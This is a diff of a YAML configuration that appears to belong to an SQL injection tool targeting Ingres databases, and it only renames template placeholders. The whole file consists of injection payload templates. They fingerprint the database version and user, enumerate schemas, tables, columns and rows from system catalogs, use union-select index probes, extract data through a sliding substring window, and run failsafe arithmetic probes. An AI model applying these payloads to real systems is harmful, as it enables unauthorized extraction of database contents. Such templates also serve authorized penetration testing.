@@ -3,113 +3,113 @@ resource:
  info: |
   SELECT 
       dbmsinfo('_version')
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || dbmsinfo('database')
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || dbmsinfo('session_user')
-      || ${TRAIL_HEX} 
+      || ${trail_hex} 
       r
       
  schema: 
   database: |
    select 
        rr
-       || ${TRAIL_HEX} 
+       || ${trail_hex} 
        r
    from (
        select 
-           ${ENCLOSE_VALUE_HEX}
+           ${enclose_value_hex}
            || trim(t.schema_name)
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}'
            rr
        from
            (select distinct schema_name from iischema) t,
            (select distinct schema_name from iischema) t1
        where t.schema_name >= t1.schema_name
        group by 1
-       {limit}
+       ${limit}
    ) a
    
   table: |
    select 
        rr
-       || ${TRAIL_HEX} 
+       || ${trail_hex} 
        r
    from (
        select 
-           ${ENCLOSE_VALUE_HEX}
+           ${enclose_value_hex}
            || trim(t.table_name)
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}'
            rr
        from
-           (select distinct table_name from iiingres_tables where table_owner = '${DATABASE}') t,
-           (select distinct table_name from iiingres_tables where table_owner = '${DATABASE}') t1
+           (select distinct table_name from iiingres_tables where table_owner = '${database}') t,
+           (select distinct table_name from iiingres_tables where table_owner = '${database}') t1
        where t.table_name >= t1.table_name
        group by 1
-       {limit}
+       ${limit}
    ) a
    
   column: |
    select 
        rr
-       || ${TRAIL_HEX} 
+       || ${trail_hex} 
        r
    from (
        select 
-           ${ENCLOSE_VALUE_HEX}
+           ${enclose_value_hex}
            || trim(t.column_name)
-           || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           || '${separator_qte_sql}0${enclose_value_sql}'
            rr
        from
-           (select distinct column_name from iiocolumns where table_owner = '${DATABASE}' and table_name = '${TABLE}') t,
-           (select distinct column_name from iiocolumns where table_owner = '${DATABASE}' and table_name = '${TABLE}') t1
+           (select distinct column_name from iiocolumns where table_owner = '${database}' and table_name = '${table}') t,
+           (select distinct column_name from iiocolumns where table_owner = '${database}' and table_name = '${table}') t1
        where t.column_name >= t1.column_name
        group by 1
-       {limit}
+       ${limit}
    ) a
    
   row: 
    query: |
     select 
         rr
-        ||${TRAIL_HEX} 
+        ||${trail_hex} 
         r
     from (
         select 
-            ${ENCLOSE_VALUE_HEX}
+            ${enclose_value_hex}
             || trim(t.s)
-            || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+            || '${separator_qte_sql}0${enclose_value_sql}'
             rr
         from
-            (select distinct ${FIELDS} s from "${DATABASE}".${TABLE}) t,
-            (select distinct ${FIELDS} s from "${DATABASE}".${TABLE}) t1
+            (select distinct ${fields} s from "${database}".${table}) t,
+            (select distinct ${fields} s from "${database}".${table}) t1
         where t.s >= t1.s
         group by 1
-        {limit}
+        ${limit}
     ) a
    fields: 
-    field: trim(ifnull(varchar(${FIELD}), ''))"
+    field: trim(ifnull(varchar(${field}), ''))"
     concat: "|| 0x7f ||"
     
 strategy: 
  configuration: 
   slidingWindow: |
-   '${LEAD}'
+   '${lead}'
    ||substr(
        r,
-       ${INDEX},
+       ${index},
        65536
    ) r
    from (
-       ${INJECTION}
+       ${injection}
    )
-  limit: having count(*) between ${LIMIT} and ${LIMIT}
-  failsafe: select 1337${INDICE}7330%2b1 r
+  limit: having count(*) between ${limit.value} and ${limit.value}
+  failsafe: select 1337${indice}7330%2b1 r
   calibrator: |
    rpad(
-       '${CALIBRATOR_SQL}', 
+       '${calibrator_sql}', 
        1024, 
-       '${CALIBRATOR_SQL}'
+       '${calibrator_sql}'
    )
   limitBoundary: 1
   fingerprint: 
@@ -117,6 +117,6 @@ strategy:
     - Non-terminated string
     
  normal: 
-  indices: union select ${RESULT_RANGE} from (${INDICE_UNIQUE})b
-  capacity: "'${LEAD}${INDICE}' || ${CALIBRATOR}"
+  indices: union select ${result_range} from (${indice_unique})b
+  capacity: "'${lead}${indice}' || ${calibrator}"
   orderBy: order by 1337
